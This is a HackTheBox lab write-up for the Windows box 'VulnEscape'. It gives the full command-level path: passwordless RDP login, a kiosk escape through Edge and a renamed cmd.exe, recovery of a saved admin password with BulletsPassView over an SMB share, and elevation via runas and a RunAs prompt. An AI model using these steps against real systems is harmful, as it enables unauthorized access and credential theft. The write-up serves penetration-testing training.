# HTB: VulnEscape Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-green)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)

---

## Box Info

| Field | Details |
|-------|---------|
| **Name** | VulnEscape |
| **OS** | Windows 10 Pro (Build 19045) |
| **Difficulty** | Easy |
| **IP** | 10.129.234.51 |
| **Creator** | xct |

---

## Attack Chain Overview

```
RDP Login (KioskUser0 / no password)
        ↓
Kiosk Escape via Microsoft Edge
        ↓
Shell via renamed cmd.exe → msedge.exe
        ↓
Found profiles.xml with encrypted admin password
        ↓
BulletsPassView → recovered plaintext password
        ↓
runas /user:admin → low-priv admin shell
        ↓
Start-Process -Verb RunAs → UAC bypass
        ↓
Full SYSTEM-level access → root.txt
```

---

## 1. Reconnaissance

Full port scan against the target:

```bash
nmap -sV -sC -p- --reason 10.129.234.51 --min-rate 5000 -vvv
```

**Result:** Only one open port found.

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Key findings from the scan:
- Hostname: `ESCAPE`
- Domain: `Escape`
- OS: Windows 10 Build 19041
- NLA: **Disabled** (important for RDP access)

---

## 2. Initial Access — Finding KioskUser0

Connected via xfreerdp to view the RDP login screen:

```bash
xfreerdp /v:10.129.234.51 /cert:ignore /sec:tls
```

The Windows 10 login screen displayed a user tile revealing the username **KioskUser0**. Verified credentials with netexec:

```bash
nxc rdp 10.129.234.51 -u KioskUser0 -p ''
```

```
RDP    10.129.234.51  3389  ESCAPE  [+] Escape\KioskUser0: (Pwn3d!)
```

No password required. Logged in via RDP.

---

## 3. Kiosk Escape

After logging in, the system presented a **full screen image** — a classic Windows Kiosk mode lockdown. No desktop, no taskbar, no shell access.

### Breaking Out of Kiosk Mode

1. Pressed the **Windows key** to open the Start Menu
2. Searched for **"edge"** — Microsoft Edge was whitelisted and launched successfully
3. In Edge's address bar, typed `C:\` to browse the filesystem like a file manager
4. Navigated to `C:\Users\kioskUser0\Desktop\` and found `user.txt`

### Getting a Shell

1. Browsed to `C:\Windows\System32\` in Edge
2. Clicked `cmd.exe` — it downloaded to the Downloads folder
3. Attempted to run `cmd.exe` → **blocked** (allow-list restriction, not block-list)
4. Renamed to `0xdf.exe` → still blocked
5. Renamed to **`msedge.exe`** (Edge binary name is whitelisted) → **shell opened!**
6. Ran `powershell` inside the cmd shell for a full PowerShell session

```powershell
# Confirmed identity
whoami
# escape\kioskuser0
```

---

## 4. Enumeration as KioskUser0

### System Information

```powershell
whoami /all        # Medium Mandatory Level — low privilege
net user           # Users: admin, Administrator, kioskUser0, Guest
systeminfo         # Windows 10 Pro Build 19045
```

### Discovered Hidden Directory

```powershell
ls -force C:\
```

Found a non-standard hidden directory: **`C:\_admin`**

```powershell
ls C:\_admin
```

```
Mode    LastWriteTime    Length  Name
----    -------------    ------  ----
d-----  2/3/2024  3:04AM         installers
d-----  2/3/2024  3:05AM         passwords
d-----  2/3/2024  3:05AM         temp
-a----  2/3/2024  3:03AM      0  Default.rdp
-a----  2/3/2024  3:04AM    574  profiles.xml
```

### Reading profiles.xml

```powershell
type C:\_admin\profiles.xml
```

```xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
```

The password is **encrypted** by Remote Desktop Plus (not simple Base64). This profile connects to localhost (`127.0.0.1`) as user `admin`.

---

## 5. Recovering Admin Password — BulletsPassView

Remote Desktop Plus displays saved passwords as `●●●●` bullets. The tool **BulletsPassView** by NirSoft can reveal characters hidden behind bullet fields.

### Step 1 — Download BulletsPassView on Kali

```bash
cd /home/kali/HTB/VulnEscape
wget https://www.nirsoft.net/utils/bulletspassview.zip
unzip bulletspassview.zip
ls
# BulletsPassView.exe confirmed
```

### Step 2 — Serve via SMB

```bash
smbserver.py share $(pwd) -smb2support -username ounnha -password ounnha
```

### Step 3 — Transfer to Target

```powershell
# Mount the SMB share
net use \\<KALI_IP>\share /u:ounnha ounnha

# Copy tools over
copy \\<KALI_IP>\share\BulletsPassView.exe C:\Users\kioskUser0\Downloads\

# Copy profiles.xml to accessible location
copy C:\_admin\profiles.xml C:\Users\kioskUser0\Downloads\
```

### Step 4 — Load Profile in Remote Desktop Plus

```powershell
& "C:\Program Files (x86)\Remote Desktop Plus\rdp.exe"
```

- Clicked **Manage Profiles → Import**
- Selected `C:\Users\kioskUser0\Downloads\profiles.xml`
- Profile loaded with password displayed as `●●●●` bullets

### Step 5 — Capture Password with BulletsPassView

While the profile was open and bullets were visible on screen:

```powershell
C:\Users\kioskUser0\Downloads\BulletsPassView.exe /stext C:\Users\kioskUser0\Downloads\passwords.txt
type C:\Users\kioskUser0\Downloads\passwords.txt
```

**Admin password recovered in plaintext.**

---

## 6. Shell as Admin — Lateral Movement

```powershell
runas /user:admin powershell
# Enter recovered password when prompted
```

A new PowerShell window opened as `escape\admin`. However, checking privileges:

```powershell
whoami /priv
# Only basic privileges — SeChangeNotifyPrivilege, SeShutdownPrivilege, etc.
# Missing: SeDebugPrivilege, SeImpersonatePrivilege
```

The shell was **UAC-limited** despite `admin` being in the Administrators group.

---

## 7. UAC Bypass → Full Privileges

With GUI access via RDP, the simplest UAC bypass is triggering an interactive elevation prompt:

```powershell
Start-Process powershell -Verb RunAs
```

This popped the **UAC dialog** on screen. Clicked **Yes** — a new elevated (blue) PowerShell window opened.

```powershell
whoami /priv
# SeDebugPrivilege        Enabled
# SeImpersonatePrivilege  Enabled
# Full administrator token confirmed
```

---

## 8. Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| `user.txt` | `C:\Users\kioskUser0\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `xfreerdp` | RDP client to connect and view login screen |
| `netexec (nxc)` | Credential validation over RDP |
| `impacket smbserver.py` | Serving files to the target |
| `BulletsPassView` | Recovering password hidden behind bullets |
| `Remote Desktop Plus` | Loading the saved credential profile |

---

## Key Takeaways

- **Kiosk mode** can be escaped if whitelisted applications (like Edge) allow filesystem browsing
- **Allow-lists** by filename are weak — renaming a binary to a whitelisted name bypasses them
- **Saved credentials** in application profile files are a common privesc vector
- **UAC** does not fully protect local administrator accounts when GUI access is available
- `Start-Process -Verb RunAs` is a simple and effective UAC bypass when RDP GUI access is present
